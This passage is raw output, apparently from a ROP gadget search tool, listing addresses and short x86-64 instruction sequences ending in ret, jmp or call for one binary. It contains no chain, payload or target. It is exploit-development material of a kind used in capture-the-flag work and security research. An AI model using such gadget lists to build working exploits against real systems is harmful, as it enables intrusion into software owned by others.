0x0000000000491d84 : jmp qword ptr [rdi]
0x000000000047d397 : jmp qword ptr [rdx + 0x12ffface]
0x000000000047d39f : jmp qword ptr [rdx + 0x32fffad4]
0x0000000000457024 : jmp qword ptr [rdx + rax*8]
0x000000000047cec7 : jmp qword ptr [rdx]
0x000000000040d039 : jmp qword ptr [rsi + 0xf]
0x000000000047c897 : jmp qword ptr [rsi]
0x0000000000416c19 : jmp r10
0x000000000046baf0 : jmp r11
0x000000000041fc1d : jmp r9
0x000000000047d88b : jmp rax
0x000000000046baf1 : jmp rbx
0x000000000041e5b4 : jmp rcx
0x0000000000405cce : jmp rdi
0x00000000004059e5 : jmp rdx
0x00000000004498b7 : jmp rsi
0x0000000000451f35 : jmp rsp
0x000000000040551c : jne 0x405530 ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x0000000000406268 : jne 0x406246 ; ret
0x00000000004079d2 : jne 0x4079e5 ; add rsp, 0xd8 ; ret
0x000000000040c053 : jne 0x40c064 ; xor eax, eax ; ret
0x000000000040d268 : jne 0x40d2bc ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x000000000040d2e1 : jne 0x40d2d3 ; ret
0x000000000040dcfe : jne 0x40dcf3 ; ret
0x000000000040df29 : jne 0x40df53 ; pop rbx ; ret
0x000000000040e051 : jne 0x40e017 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040e09c : jne 0x40e095 ; lea eax, [rdx + rdi] ; ret
0x000000000040e9d6 : jne 0x40e9cb ; ret
0x000000000040fceb : jne 0x40fcf2 ; ret
0x0000000000410280 : jne 0x410274 ; pop rbx ; mov rax, rdi ; pop rbp ; pop r12 ; ret
0x000000000041044d : jne 0x41045c ; add rsp, 0x10 ; pop rbx ; ret
0x000000000041414c : jne 0x414113 ; ret
0x0000000000415647 : jne 0x415636 ; sub rax, 0x10 ; ret
0x000000000041826c : jne 0x418256 ; xor eax, eax ; sub eax, ecx ; ret
0x000000000041d707 : jne 0x41d764 ; xor eax, eax ; ret
0x000000000041d6d7 : jne 0x41d788 ; xor eax, eax ; ret
0x000000000041db83 : jne 0x41dba7 ; xor eax, eax ; vzeroupper ; ret
0x000000000041e2ba : jne 0x41e2c5 ; vzeroupper ; ret
0x000000000041e3b4 : jne 0x41e2c6 ; ret
0x000000000041e4ff : jne 0x41e2c9 ; vzeroupper ; ret
0x000000000041fb6d : jne 0x41fb97 ; xor eax, eax ; ret
0x000000000041f161 : jne 0x41fb9b ; xor eax, eax ; ret
0x000000000041f189 : jne 0x41fba7 ; xor eax, eax ; ret
0x0000000000436f45 : jne 0x436ed6 ; lea rax, [rdi + 3] ; ret
0x0000000000436f17 : jne 0x436ed6 ; lea rax, [rdi + 7] ; ret
0x0000000000436f16 : jne 0x436ed7 ; lea rax, [rdi + 7] ; ret
0x00000000004386a4 : jne 0x4388b8 ; xor eax, eax ; ret
0x00000000004388a9 : jne 0x4388c9 ; xor eax, eax ; ret
0x0000000000438751 : jne 0x4388cd ; xor eax, eax ; ret
0x00000000004388c1 : jne 0x4388ce ; cmp eax, ecx ; sbb eax, eax ; sbb eax, -1 ; ret
0x00000000004389d1 : jne 0x4389c2 ; ret
0x0000000000438a81 : jne 0x438a72 ; ret
0x0000000000438bf1 : jne 0x438be6 ; lea rax, [rcx - 1] ; ret
0x0000000000438d41 : jne 0x438d36 ; sub rax, 1 ; ret
0x000000000043a04d : jne 0x43a036 ; ret
0x000000000043a1b4 : jne 0x43a19c ; vzeroupper ; ret
0x000000000043a377 : jne 0x43a357 ; vzeroupper ; ret
0x000000000043aacf : jne 0x43aafb ; add rsp, 0x20 ; pop rbx ; ret
0x000000000043b747 : jne 0x43b75f ; add rsp, 0x28 ; ret
0x000000000043b977 : jne 0x43b9c1 ; add rsp, 0x58 ; ret
0x000000000043bbc6 : jne 0x43bc11 ; add rsp, 0x18 ; ret
0x000000000043bd47 : jne 0x43bd54 ; add rsp, 0x58 ; ret
0x000000000043c676 : jne 0x43c68d ; add rsp, 0x28 ; ret
0x000000000043c953 : jne 0x43c963 ; ret
0x000000000043d41a : jne 0x43d418 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000043d701 : jne 0x43d6d0 ; jmp 0x43d669
0x000000000043d9d1 : jne 0x43d9c9 ; pop rdx ; pop r10 ; ret
0x0000000000440bcf : jne 0x440b63 ; call rsi
0x000000000044a44f : jne 0x44a45c ; add rsp, 0x18 ; ret
0x000000000044a697 : jne 0x44a6ec ; add rsp, 0x148 ; ret
0x00000000004560a2 : jne 0x4560b5 ; add rsp, 0xd8 ; ret
0x000000000045dac1 : jne 0x45dab3 ; ret
0x000000000045e61c : jne 0x45e615 ; lea eax, [rdx + rdi] ; ret
0x000000000045e902 : jne 0x45e8ce ; xor eax, eax ; jmp 0x45e8d3
0x000000000045ff33 : jne 0x45ff3e ; xor rax, rax ; ret
0x0000000000460333 : jne 0x460368 ; mov rax, r8 ; vzeroupper ; ret
0x0000000000460bdc : jne 0x460bd3 ; ret
0x0000000000460be3 : jne 0x460bee ; xor rax, rax ; ret
0x0000000000460e7b : jne 0x460e36 ; mov rax, rdx ; ret
0x0000000000461e3c : jne 0x461e89 ; add rsp, 0x58 ; ret
0x0000000000461ebf : jne 0x461ed2 ; movzx eax, al ; add rsp, 0x58 ; ret
0x0000000000461f83 : jne 0x461fa9 ; add rsp, 0x38 ; ret
0x0000000000462321 : jne 0x462373 ; ret
0x0000000000462392 : jne 0x462380 ; ret
0x00000000004676e5 : jne 0x4676ec ; pop rbx ; ret
0x0000000000468325 : jne 0x46832b ; call rax
0x0000000000468325 : jne 0x46832f ; call rax
0x000000000046a178 : jne 0x46a154 ; mov eax, dword ptr [rcx] ; ret
0x000000000046ad37 : jne 0x46acd3 ; and eax, dword ptr [rax] ; ret
0x000000000046ae27 : jne 0x46ae41 ; mov rax, qword ptr [rip + 0x239580] ; ret
0x000000000046ae7c : jne 0x46ae53 ; ret
0x000000000046c8f8 : jne 0x46c8d1 ; movsx eax, dl ; neg eax ; ret
0x000000000046d291 : jne 0x46d2c9 ; add rsp, 0x38 ; ret
0x000000000046d326 : jne 0x46d33a ; add rsp, 0x38 ; ret
0x000000000046d436 : jne 0x46d45a ; add rsp, 0x48 ; ret
0x000000000046d4ea : jne 0x46d4f9 ; add rsp, 0x20 ; pop rbx ; ret
0x000000000046d5e6 : jne 0x46d5fa ; add rsp, 0x38 ; ret
0x000000000046d6a0 : jne 0x46d6ba ; add rsp, 0x38 ; ret
0x000000000046eeb1 : jne 0x46eef1 ; leave ; ret
0x000000000046f361 : jne 0x46f34d ; mov rax, rsi ; ret
0x000000000046f3e5 : jne 0x46f3c5 ; mov rax, rsi ; ret
0x000000000046f44f : jne 0x46f46b ; add rsp, 0x38 ; ret
0x000000000046f709 : jne 0x46f713 ; ret
0x000000000046fa7d : jne 0x46fa8a ; add rsp, 0x38 ; ret
0x000000000046fb60 : jne 0x46fb7a ; add rsp, 0x38 ; ret
0x0000000000472ccb : jne 0x472ce2 ; add rsp, 0x38 ; ret
0x0000000000472dc8 : jne 0x472ddb ; add rsp, 0x30 ; pop rbx ; ret
0x0000000000472e7d : jne 0x472e93 ; add rsp, 0x30 ; pop rbx ; ret
0x00000000004740ca : jne 0x473ff8 ; ret
0x0000000000474c79 : jne 0x474c8c ; add rsp, 0x28 ; ret
0x0000000000475299 : jne 0x4752bc ; xor eax, eax ; ret
0x0000000000475281 : jne 0x4752c1 ; mov rax, qword ptr [rsi + 0xb0] ; ret
0x00000000004774b0 : jne 0x4774d1 ; mov rax, qword ptr [rax] ; ret
0x000000000047751f : jne 0x47752a ; mov qword ptr [rax], rdx ; ret
0x000000000047787e : jne 0x477877 ; mov r15, qword ptr [rbp - 8] ; leave ; ret
0x0000000000477b48 : jne 0x477b41 ; mov r15, qword ptr [rbp - 8] ; leave ; ret
0x0000000000477e83 : jne 0x477e7c ; mov r15, qword ptr [rbp - 8] ; leave ; ret
0x00000000004783d4 : jne 0x4783f3 ; ret
0x00000000004783f4 : jne 0x47840c ; mov eax, 8 ; ret
0x000000000047841f : jne 0x47844e ; mov rax, qword ptr [rsi + 0x10] ; ret
0x0000000000478439 : jne 0x478452 ; xor eax, eax ; ret
0x000000000047927f : jne 0x4792ae ; mov rax, qword ptr [rsi + 0x10] ; ret
0x0000000000479299 : jne 0x4792b2 ; xor eax, eax ; ret
0x0000000000479839 : jne 0x479843 ; ret
0x0000000000479854 : jne 0x479863 ; ret
0x0000000000479a84 : jne 0x479a93 ; ret
0x0000000000479d09 : jne 0x479d2c ; xor eax, eax ; ret
0x000000000047a2d5 : jne 0x47a2c8 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000047a320 : jne 0x47a300 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000047a445 : jne 0x47a42b ; pop rbx ; ret
0x000000000047a543 : jne 0x47a530 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000047aa1d : jne 0x47aa06 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000047aaeb : jne 0x47aaf3 ; ret
0x0000000000415dbb : jno 0x415e13 ; add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x0000000000415dbb : jno 0x415e15 ; add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x000000000041f41e : jno 0x41f42d ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000042a810 : jno 0x42a819 ; vmovups zmmword ptr [r9 - 0x40], zmm7 ; ret
0x000000000042aa4a : jno 0x42aa53 ; vmovups zmmword ptr [r9 - 0x40], zmm15 ; ret
0x000000000042abb1 : jno 0x42abc2 ; vmovups zmmword ptr [r9 + 0x1c0], zmm15 ; ret
0x000000000042ad16 : jno 0x42ad9a ; adc qword ptr [rdi - 8], rdi ; ret
0x0000000000466ca4 : jno 0x466cae ; add byte ptr [rax + 0xf], cl ; ret 0x3e80
0x000000000046de54 : jno 0x46dea6 ; shl ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x000000000049571e : jno 0x49572c ; ret
0x0000000000415d01 : jnp 0x415d3a ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x0000000000415d01 : jnp 0x415d3b ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x0000000000416b21 : jnp 0x416b54 ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x0000000000416b21 : jnp 0x416b55 ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x000000000048ffa5 : jnp 0x48ff62 ; ret
0x00000000004167bf : jns 0x4167c7 ; add byte ptr [rsi + rax*8 - 0xd], dh ; ret
0x000000000042a817 : jns 0x42a81a ; ret
0x000000000042aa51 : jns 0x42aa54 ; ret
0x000000000042abb8 : jns 0x42abc3 ; ret
0x00000000004659ac : jns 0x4659ba ; add byte ptr [rcx + 0xf], al ; xchg eax, esp ; ret 0x8545
0x000000000047516e : jns 0x47517b ; mov r8, qword ptr [r8] ; mov qword ptr [r10], r8 ; ret
0x000000000047741e : jns 0x477461 ; add byte ptr [rbp + rbx + 0x48], dh ; add esp, 0x18 ; ret
0x000000000047818e : jns 0x47819b ; mov r8, qword ptr [r8] ; mov qword ptr [r10], r8 ; ret
0x0000000000479d8e : jns 0x479d9b ; mov r8, qword ptr [r8] ; mov qword ptr [r10], r8 ; ret
0x000000000048f0ae : jns 0x48f044 ; ret 0xf869
0x000000000048f0ad : jns 0x48f045 ; ret 0xf869
0x00000000004914be : jns 0x491515 ; jmp 0x491456
0x000000000040a443 : jo 0x40a4b8 ; sub dword ptr [rax], eax ; add byte ptr [rdx + rax - 0xd], dh ; ret
0x000000000040be74 : jo 0x40bec5 ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040bea4 : jo 0x40bef5 ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x000000000043c94d : jo 0x43c960 ; test sil, 1 ; jne 0x43c969 ; ret
0x0000000000444385 : jo 0x44439d ; mov dh, 0x48 ; dec dword ptr [rax - 0x7d] ; ret 0x4801
0x0000000000454f61 : jo 0x454f6c ; add byte ptr [rdi + rcx + 0x45], cl ; ret 0xf4c
0x000000000045db3a : jo 0x45db52 ; mov qword ptr [rax + 0x40], rcx ; ret
0x00000000004607ad : jo 0x46080f ; pop rbp ; pop r12 ; ret
0x0000000000474a2f : jo 0x474a95 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000047cfe0 : jo 0x47cf8a ; cli ; jmp rax
0x000000000047d7a4 : jo 0x47d7ce ; sti ; call qword ptr [rax]
0x000000000047d7c4 : jo 0x47d7fb ; sti ; call qword ptr [rax]
0x000000000047d7f0 : jo 0x47d836 ; sti ; inc eax ; sti ; call qword ptr [rax]
0x0000000000490124 : jo 0x49019e ; mov ebp, 0xfb67d10d ; ret
0x00000000004971b1 : jo 0x4971ad ; call rsp
0x00000000004971ac : jo 0x4971e7 ; add byte ptr [rax], al ; add byte ptr [rax - 8], dh ; call rsp
0x00000000004974ac : jo 0x4974ea ; add byte ptr [rax], al ; shr ah, 0xf9 ; jmp qword ptr [rbx]
0x0000000000497b70 : jo 0x497bb0 ; cli ; jmp qword ptr [rcx]
0x000000000049bd25 : jo 0x49bd2c ; ret
0x000000000049cf89 : jo 0x49cf8a ; jmp qword ptr [rdx]
0x000000000049cf88 : jo 0x49cf8b ; jmp qword ptr [rdx]
0x000000000043ee92 : jp 0x43eef7 ; add byte ptr es:[rbp - 0xcf98b40], al ; ret
0x0000000000426f0a : jrcxz 0x426f05 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000426f09 : jrcxz 0x426f06 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000429a2a : jrcxz 0x429a25 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000429a29 : jrcxz 0x429a26 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043da23 : jrcxz 0x43d9e8 ; cmp r11d, 0xa ; je 0x43da34 ; ret
0x00000000004716df : jrcxz 0x471733 ; mov esp, eax ; nop dword ptr [rax + rax] ; call qword ptr [rbx]
0x000000000047a544 : jrcxz 0x47a595 ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x000000000048ef05 : jrcxz 0x48ef5f ; ret
0x0000000000403ef6 : js 0x403f06 ; inc dword ptr [rcx + 0xf] ; xchg eax, ebp ; ret
0x0000000000403fd0 : js 0x403fe0 ; inc dword ptr [rcx + 0xf] ; xchg eax, ebp ; ret
0x0000000000406f25 : js 0x406f49 ; call rdx
0x00000000004448a8 : js 0x444835 ; ret 0x8348
0x00000000004490fb : js 0x449106 ; mov byte ptr [rax], 0x2f ; mov byte ptr [rdi], 0 ; ret
0x0000000000467782 : js 0x467795 ; pop rbx ; ret
0x000000000046877f : js 0x4687d1 ; mov eax, dword ptr [rbx + 0x10] ; add rax, qword ptr [r14] ; call rax
0x00000000004776d6 : js 0x4776e3 ; add byte ptr [rax], al ; mov rax, rbp ; pop rbx ; pop rbp ; ret
0x00000000004776e3 : js 0x4776ef ; add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x000000000048d658 : js 0x48d60e ; std ; call qword ptr [rax]
0x0000000000497718 : js 0x497745 ; cli ; call qword ptr [rax]
0x0000000000497768 : js 0x497796 ; cli ; call qword ptr [rbx]
0x00000000004981c8 : js 0x498224 ; cli ; jmp qword ptr [rcx]
0x00000000004982b4 : js 0x498300 ; add byte ptr [rax], al ; mov byte ptr [rax - 6], bl ; call qword ptr [rcx]
0x000000000049c748 : js 0x49c77a ; std ; jmp qword ptr [rdx]
0x000000000047d0d1 : lahf ; cli ; call qword ptr [rdx + 0x22fffa9e]
0x000000000047d0cd : lahf ; cli ; jmp qword ptr [rdx]
0x00000000004915e3 : lahf ; mov dh, 0xc7 ; ret 0xe71f
0x0000000000431b4d : lahf ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004205b5 : lahf ; ret
0x000000000040f2ff : lahf ; ret 0x3949
0x000000000040f3b2 : lahf ; ret 0x48e9
0x000000000048ee3d : lahf ; ret 0x871e
0x0000000000451c80 : lahf ; ret 0x87e
0x0000000000451848 : lahf ; ret 0x8e0f
0x000000000043a409 : lahf ; ret 0xea81
0x0000000000476a91 : lahf ; ret 0xf45
0x0000000000462ff9 : lahf ; sub byte ptr [rcx], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00000000004321dd : lar eax, word ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000048c3ab : lcall [rbp + rdi*8 - 4] ; jmp rsp
0x000000000048d5bb : lcall [rbp - 0x1f000247] ; test al, 0xfd ; jmp qword ptr [rax]
0x000000000040fe70 : lcall [rbx + 0x5d] ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000409d75 : lcall [rbx + 0x5d] ; pop r12 ; ret
0x0000000000409afb : lcall [rbx + 0x5d] ; ret
0x000000000046b786 : lcall [rbx + 0x64] ; mov eax, dword ptr [rax] ; ret
0x0000000000492fef : lcall [rcx + rcx*8 - 0x36530003] ; std ; call qword ptr [rbx]
0x000000000048c3bf : lcall [rdi*8 - 0x21b0004] ; cld ; jmp rsp
0x000000000048c41b : lcall [rdi*8 - 0x32b0004] ; cld ; jmp rsp
0x000000000047d24f : lcall [rsi + 0x2efffacf] ; iretd ; cli ; call rsp
0x000000000047d093 : lcall [rsi + rbx*4 - 0x61d30006] ; cli ; call rdx
0x0000000000427596 : lddqu xmm0, xmmword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x000000000040e0ab : lea eax, [r8 - 1] ; ret
0x000000000047518c : lea eax, [rax + 8] ; mov qword ptr [r10], r8 ; ret
0x000000000041d734 : lea eax, [rax + rdi + 0x10] ; ret
0x000000000041d744 : lea eax, [rax + rdi + 0x20] ; ret
0x000000000041d714 : lea eax, [rax + rdi - 0x10] ; ret
0x000000000040e0ac : lea eax, [rax - 1] ; ret
0x000000000045fc5d : lea eax, [rcx + rsi] ; ret
0x0000000000438bf4 : lea eax, [rcx - 1] ; ret
0x0000000000436c6c : lea eax, [rdi + 0x10] ; ret
0x0000000000436c81 : lea eax, [rdi + 0x11] ; ret
0x0000000000436c9f : lea eax, [rdi + 0x12] ; ret
0x0000000000436cbf : lea eax, [rdi + 0x13] ; ret
0x0000000000436ce2 : lea eax, [rdi + 0x14] ; ret
0x0000000000436d01 : lea eax, [rdi + 0x15] ; ret
0x0000000000436d21 : lea eax, [rdi + 0x16] ; ret
0x0000000000436d41 : lea eax, [rdi + 0x17] ; ret
0x0000000000436d64 : lea eax, [rdi + 0x18] ; ret
0x0000000000436d89 : lea eax, [rdi + 0x19] ; ret
0x0000000000436da7 : lea eax, [rdi + 0x1a] ; ret
0x0000000000436dc7 : lea eax, [rdi + 0x1b] ; ret
0x0000000000436de3 : lea eax, [rdi + 0x1c] ; ret
0x0000000000436e03 : lea eax, [rdi + 0x1d] ; ret
0x0000000000436e23 : lea eax, [rdi + 0x1e] ; ret
0x0000000000436e43 : lea eax, [rdi + 0x1f] ; ret
0x0000000000436bbd : lea eax, [rdi + 0xa] ; ret
0x0000000000436bdd : lea eax, [rdi + 0xb] ; ret
0x0000000000436bff : lea eax, [rdi + 0xc] ; ret
0x0000000000436c1f : lea eax, [rdi + 0xd] ; ret
0x0000000000436c3f : lea eax, [rdi + 0xe] ; ret
0x0000000000436c59 : lea eax, [rdi + 0xf] ; ret
0x0000000000436b07 : lea eax, [rdi + 1] ; ret
0x0000000000436b1a : lea eax, [rdi + 2] ; ret
0x0000000000436b25 : lea eax, [rdi + 3] ; ret
0x0000000000436b38 : lea eax, [rdi + 4] ; ret
0x0000000000436b4d : lea eax, [rdi + 5] ; ret
0x0000000000436b6b : lea eax, [rdi + 6] ; ret
0x0000000000436b77 : lea eax, [rdi + 7] ; ret
0x0000000000436b8a : lea eax, [rdi + 8] ; ret
0x0000000000436b9f : lea eax, [rdi + 9] ; ret
0x000000000041d769 : lea eax, [rdi + rax + 0x10] ; ret
0x000000000041d779 : lea eax, [rdi + rax + 0x20] ; ret
0x000000000041d673 : lea eax, [rdi + rax + 0x30] ; ret
0x000000000045fea5 : lea eax, [rdi + rax - 0x20] ; vzeroupper ; ret
0x00000000004326d7 : lea eax, [rdi + rax] ; ret
0x0000000000438f4a : lea eax, [rdi + rcx] ; sub rax, rsi ; ret
0x000000000045fb59 : lea eax, [rdi + rsi] ; ret
0x0000000000436af3 : lea eax, [rdi] ; ret
0x00000000004360dd : lea eax, [rdx + 0xa] ; ret
0x00000000004360fd : lea eax, [rdx + 0xb] ; ret
0x000000000043611f : lea eax, [rdx + 0xc] ; ret
0x000000000043613f : lea eax, [rdx + 0xd] ; ret
0x000000000043615f : lea eax, [rdx + 0xe] ; ret
0x0000000000435fef : lea eax, [rdx + 0xf] ; ret
0x0000000000436017 : lea eax, [rdx + 1] ; ret
0x000000000043602d : lea eax, [rdx + 2] ; ret
0x0000000000436045 : lea eax, [rdx + 3] ; ret
0x000000000043605b : lea eax, [rdx + 4] ; ret
0x000000000043606d : lea eax, [rdx + 5] ; ret
0x000000000043608b : lea eax, [rdx + 6] ; ret
0x0000000000435f97 : lea eax, [rdx + 7] ; ret
0x000000000043609d : lea eax, [rdx + 8] ; ret
0x00000000004360bd : lea eax, [rdx + 9] ; ret
0x000000000040e09e : lea eax, [rdx + rdi] ; ret
0x000000000043a523 : lea eax, [rdx + rdx] ; pop rbx ; and eax, 0x7ff80000 ; ret
0x00000000004155c6 : lea eax, [rdx - 0x10] ; ret
0x0000000000436005 : lea eax, [rdx] ; ret
0x0000000000416b78 : lea eax, [rip + 0x1bb12] ; cmove rax, rdx ; ret
0x0000000000415d78 : lea eax, [rip + 0x1cf42] ; cmove rax, rdx ; ret
0x000000000041672f : lea eax, [rip + 0x221ab] ; cmove rax, rdx ; ret
0x0000000000416ab8 : lea eax, [rip + 0x22732] ; cmovne rax, rdx ; ret
0x0000000000416978 : lea eax, [rip + 0x22862] ; cmovne rax, rdx ; ret
0x0000000000416818 : lea eax, [rip + 0x229d2] ; cmovne rax, rdx ; ret
0x0000000000416b1f : lea eax, [rip + 0x22a7b] ; cmovne rax, rdx ; ret
0x00000000004169df : lea eax, [rip + 0x22bab] ; cmovne rax, rdx ; ret
0x000000000041687f : lea eax, [rip + 0x22d1b] ; cmovne rax, rdx ; ret
0x0000000000416afe : lea eax, [rip + 0x22ecc] ; cmovne rax, rdx ; ret
0x00000000004169be : lea eax, [rip + 0x22ffc] ; cmovne rax, rdx ; ret
0x0000000000415cff : lea eax, [rip + 0x2307b] ; cmovne rax, rdx ; ret
0x000000000041685e : lea eax, [rip + 0x2316c] ; cmovne rax, rdx ; ret
0x00000000004168ea : lea eax, [rip + 0x23660] ; cmovne rax, rdx ; ret
0x00000000004168cd : lea eax, [rip + 0x237dd] ; cmovne rax, rdx ; ret
0x000000000041691e : lea eax, [rip + 0x2390c] ; cmovne rax, rdx ; ret
0x000000000044e583 : lea eax, [rip + 0x2500b7] ; jmp rax
0x000000000043ee81 : lea eax, [rip + 0x263479] ; ret
0x000000000046fc1f : lea eax, [rip + 0x5b] ; cmovne rax, rdx ; ret
0x0000000000416b48 : lea eax, [rip + 0x6c52] ; cmove rax, rdx ; ret
0x0000000000416758 : lea eax, [rip + 0x6d12] ; cmove rax, rdx ; ret
0x00000000004167bc : lea eax, [rip + 0x79ee] ; je 0x416793 ; ret
0x000000000045f158 : lea eax, [rip + 0x912] ; cmove rax, rdx ; ret
0x0000000000460488 : lea eax, [rip + 0xa12] ; cmove rax, rdx ; ret
0x000000000045f128 : lea eax, [rip + 0xe02] ; cmove rax, rdx ; ret
0x000000000044a824 : lea ebp, [rdi + rax] ; mov rdi, rbp ; call r12
0x000000000048f6f1 : lea ebx, [rsi - 0x3271f33] ; test al, 0x97 ; xchg eax, esp ; ret
0x000000000046064b : lea ecx, [rax + 1] ; call rbx
0x00000000004607e6 : lea ecx, [rax + 4] ; lea r9, [rsp + 0x20] ; call rbx
0x000000000045eb74 : lea ecx, [rbp - 0x40] ; mov rdi, r15 ; call r12
0x000000000041fc80 : lea ecx, [rbx + rcx] ; jmp r9
0x000000000043638e : lea ecx, [rbx + rcx] ; jmp rcx
0x00000000004155d6 : lea ecx, [rdx - 8] ; cmovne rax, rcx ; ret
0x000000000046eff0 : lea ecx, [rdx] ; jmp 0x46f046
0x0000000000472b40 : lea ecx, [rdx] ; jmp 0x472b96
0x00000000004620d7 : lea ecx, [rsi + rcx*4] ; add eax, dword ptr [rcx + rdx] ; ret
0x000000000045e980 : lea ecx, [rsp + 0x10] ; mov rdi, r12 ; call rbx
0x000000000045e89b : lea ecx, [rsp + 0x18] ; mov rdi, r12 ; call rbx
0x000000000046076e : lea ecx, [rsp + 0x20] ; call rbx
0x0000000000460646 : lea ecx, [rsp + 0x28] ; lea rcx, [rax + 1] ; call rbx
0x000000000046095c : lea ecx, [rsp + 0x30] ; mov rdi, rbp ; call rbx
0x00000000004490fa : lea edi, [rax + 1] ; mov byte ptr [rax], 0x2f ; mov byte ptr [rdi], 0 ; ret
0x000000000043e1df : lea edi, [rcx + rax + 0x20] ; jmp rdx
0x00000000004139e3 : lea edi, [rip + 0x67d4f] ; call 0x40fc88
0x000000000040e9e1 : lea edx, [rax + 0x60] ; mov rax, qword ptr [rdi] ; mov qword ptr [rdx], rax ; ret
0x000000000045e757 : lea edx, [rax + rdx*4] ; mov qword ptr [rax], rdx ; xor eax, eax ; ret
0x000000000046417c : lea edx, [rax*8 - 8] ; call 0x400431
0x000000000041fd54 : lea edx, [rbx + rdx] ; jmp rdx
0x0000000000416c16 : lea edx, [rdx + rcx] ; jmp r10
0x0000000000420148 : lea edx, [rdx - 0x40] ; jmp r9
0x0000000000416833 : lea edx, [rip + 0x11407] ; cmovne rax, rdx ; ret
0x0000000000415cdf : lea edx, [rip + 0x1d4cb] ; cmovne rax, rdx ; ret
0x0000000000416a0f : lea edx, [rip + 0x1df4b] ; cmovne rax, rdx ; ret
0x00000000004167a4 : lea edx, [rip + 0x209c6] ; cmovne rax, rdx ; ret
0x0000000000415c78 : lea edx, [rip + 0x211d2] ; cmovne rax, rdx ; ret
0x0000000000415caf : lea edx, [rip + 0x25cb] ; cmovne rax, rdx ; ret
0x0000000000460baa : lea edx, [rip + 0x30] ; cmovne rax, rdx ; ret
0x0000000000415db9 : lea edx, [rip + 0x4f71] ; cmovne rax, rdx ; ret
0x0000000000416ad3 : lea edx, [rip + 0xe697] ; cmovne rax, rdx ; ret
0x0000000000416993 : lea edx, [rip + 0xe7b7] ; cmovne rax, rdx ; ret
0x0000000000478001 : lea esi, [rbx + rcx*8] ; mov rsi, qword ptr [r14] ; call r12
0x000000000043926f : lea esi, [rsi + rcx - 1] ; std ; rep movsb byte ptr [rdi], byte ptr [rsi] ; cld ; ret
0x000000000043ac83 : lea esp, [rbp - 0x18] ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000416c15 : lea r10, [r10 + r9] ; jmp r10
0x0000000000478000 : lea r14, [rbx + rcx*8] ; mov rsi, qword ptr [r14] ; call r12
0x000000000044e582 : lea r8, [rip + 0x2500b7] ; jmp rax
0x000000000041fc7f : lea r9, [r11 + r9] ; jmp r9
0x000000000045eb73 : lea r9, [rbp - 0x40] ; mov rdi, r15 ; call r12
0x000000000046efef : lea r9, [rdx] ; jmp 0x46f047
0x0000000000472b3f : lea r9, [rdx] ; jmp 0x472b97
0x000000000045e97f : lea r9, [rsp + 0x10] ; mov rdi, r12 ; call rbx
0x000000000045e89a : lea r9, [rsp + 0x18] ; mov rdi, r12 ; call rbx
0x000000000046076d : lea r9, [rsp + 0x20] ; call rbx
0x0000000000460645 : lea r9, [rsp + 0x28] ; lea rcx, [rax + 1] ; call rbx
0x000000000046095b : lea r9, [rsp + 0x30] ; mov rdi, rbp ; call rbx
0x000000000047518b : lea rax, [rax + 8] ; mov qword ptr [r10], r8 ; ret
0x000000000041d733 : lea rax, [rax + rdi + 0x10] ; ret
0x000000000041d743 : lea rax, [rax + rdi + 0x20] ; ret
0x000000000041d713 : lea rax, [rax + rdi - 0x10] ; ret
0x000000000045fc5c : lea rax, [rcx + rsi] ; ret
0x0000000000438bf3 : lea rax, [rcx - 1] ; ret
0x0000000000436c6b : lea rax, [rdi + 0x10] ; ret
0x0000000000436c80 : lea rax, [rdi + 0x11] ; ret
0x0000000000436c9e : lea rax, [rdi + 0x12] ; ret
0x0000000000436cbe : lea rax, [rdi + 0x13] ; ret
0x0000000000436ce1 : lea rax, [rdi + 0x14] ; ret
0x0000000000436d00 : lea rax, [rdi + 0x15] ; ret
0x0000000000436d20 : lea rax, [rdi + 0x16] ; ret
0x0000000000436d40 : lea rax, [rdi + 0x17] ; ret
0x0000000000436d63 : lea rax, [rdi + 0x18] ; ret
0x0000000000436d88 : lea rax, [rdi + 0x19] ; ret
0x0000000000436da6 : lea rax, [rdi + 0x1a] ; ret
0x0000000000436dc6 : lea rax, [rdi + 0x1b] ; ret
0x0000000000436de2 : lea rax, [rdi + 0x1c] ; ret
0x0000000000436e02 : lea rax, [rdi + 0x1d] ; ret
0x0000000000436e22 : lea rax, [rdi + 0x1e] ; ret
0x0000000000436e42 : lea rax, [rdi + 0x1f] ; ret
0x0000000000436bbc : lea rax, [rdi + 0xa] ; ret
0x0000000000436bdc : lea rax, [rdi + 0xb] ; ret
0x0000000000436bfe : lea rax, [rdi + 0xc] ; ret
0x0000000000436c1e : lea rax, [rdi + 0xd] ; ret
0x0000000000436c3e : lea rax, [rdi + 0xe] ; ret
0x0000000000436c58 : lea rax, [rdi + 0xf] ; ret
0x0000000000436b06 : lea rax, [rdi + 1] ; ret
